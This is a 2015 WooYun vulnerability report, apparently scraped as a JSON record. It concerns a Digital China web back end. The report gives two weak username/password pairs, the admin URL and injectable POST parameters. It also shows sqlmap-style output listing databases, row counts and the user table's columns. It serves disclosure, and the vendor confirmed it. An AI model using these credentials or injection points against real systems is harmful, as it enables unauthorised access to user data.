{"id": 71848, "wybug_id": "wooyun-2015-0148790", "wybug_title": "神州数码某站点存在弱口令+登录修改密码后多处SQL注入（5万多记录+几百用户）", "wybug_corp": "digitalchina.com", "wybug_author": "路人甲", "wybug_date": "2015-10-23 09:24", "wybug_open_date": "2015-12-11 09:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向公众公开  简要描述： 跟着大牛走，有泄露用户的地方帮忙打码！~~~ 详细说明：   WooYun: 神州数码某内网IP站点存在Getshell漏洞（截断上传技巧） 看了大牛提交的，截断技巧什么的估计不行了，那就看看是否还有弱口令，登录后是否有注入。虽然管理员已经加强管理，但是结果还是有漏网之鱼，找到两个弱口令，登录提示要修改密码才能登录，那就只好修改密码了！~~~这样其实还是可以猜弱口令，所以还是没有设置好！~~~一、艰难的用户弱口令\n\n\n\n\n\nwangliping/123456（测试完后密码依旧改回123456不变）gaoshuang/123456二、登录后台测试\nhttp://dckf.digitalchina.com/index.php/qa/qalist (POST)action=&sdate=2015-10-02&edate=2015-10-03&isetup=1&state=all&keyword=1\naction、sdate、edate、isetup、state、keyword都存在注入\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDatabase: p_points+---------------+---------+| Table         | Entries |+---------------+---------+| p_log         | 54440   || p_printer     | 6248    || p_image       | 4422    || p_moto        | 1749    || p_olddata     | 942     || p_user        | 872     || p_qa          | 587     || p_holidays    | 416     || p_url         | 138     || p_info        | 48      || ci_sessions   | 47      || p_qacc        | 8       || p_contact     | 3       || p_qasetup     | 3       || p_smtp        | 3       || p_sysinfo     | 1       |+---------------+---------+Database: p_orders+---------------+---------+| Table         | Entries |+---------------+---------+| p_log         | 873     || m_product     | 397     || m_pelist      | 209     || z_product     | 177     || m_team        | 109     || p_user        | 50      || m_pe          | 48      || p_info        | 22      || m_backlog     | 8       || m_orderlist   | 6       || ci_sessions   | 3       || p_smtp        | 3       || m_gongshi     | 2       || m_kclist      | 2       || p_factory     | 2       || m_order       | 1       || p_sysinfo     | 1       |+---------------+---------+Database: dcmobile+---------------+---------+| Table         | Entries |+---------------+---------+| dc_order      | 2803    || dc2           | 2789    || item_cfg      | 21      |+---------------+---------+Database: mysql+---------------+---------+| Table         | Entries |+---------------+---------+| help_relation | 993     || help_topic    | 508     || help_keyword  | 452     || help_category | 38      || `user`        | 4       || db            | 2       |+---------------+---------+Database: p_pointsTable: p_user[21 columns]+----------+--------------+| Column   | Type         |+----------+--------------+| address  | varchar(500) || area     | varchar(20)  || authcode | varchar(255) || company  | varchar(200) || demo     | varchar(255) || email    | varchar(100) || fax      | varchar(50)  || padmin   | smallint(6)  || paduit   | smallint(6)  || password | varchar(20)  || pc       | varchar(10)  || pcorrect | smallint(6)  || pplan    | smallint(6)  || ppoint   | smallint(6)  || pquery   | smallint(6)  || realname | varchar(20)  || regday   | datetime     || sign     | varchar(255) || tel      | varchar(50)  || userid   | int(11)      || username | varchar(50)  |+----------+--------------+\n后面的就不继续了！~~~   漏洞证明：  \n\n\n\n   修复方案：  修复弱口令增加验证过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-27 09:53 厂商回复： 正在处理，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}